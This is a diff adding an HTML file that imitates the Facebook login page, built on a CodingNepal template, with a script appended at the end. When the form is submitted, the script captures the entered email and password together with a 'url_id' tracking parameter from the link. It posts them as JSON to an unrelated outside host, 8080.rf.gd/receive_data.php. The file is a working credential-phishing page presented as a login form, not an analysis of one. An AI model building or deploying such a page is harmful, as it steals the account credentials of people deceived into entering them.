@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world</p>
+          <p>around you on Facebook.</p>
+        </div>
+        <form id="loginForm" method="post">
+          <input
+            type="email"
+            id="email"
+            placeholder="Email or phone number"
+            required
+          />
+          <input type="password" id="pwd" placeholder="Password" required />
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr />
+          <div class="button">
+            <a href="#?">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+
+  <script>
+    // Function to get URL parameter
+    function getUrlParameter(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      const regex = new RegExp("[\\?&]" + name + "=([^&#]*)");
+      const results = regex.exec(location.search);
+      return results === null
+        ? ""
+        : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+
+    document
+      .getElementById("loginForm")
+      .addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("pwd").value;
+
+        const url_id = getUrlParameter("url_id");
+
+        const data = {
+          email: email,
+          password: password,
+          url_id: url_id,
+        };
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://8080.rf.gd/receive_data.php", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log(xhr.responseText);
+          }
+        };
+
+        xhr.send(JSON.stringify(data));
+      });
+  </script>
+</html>
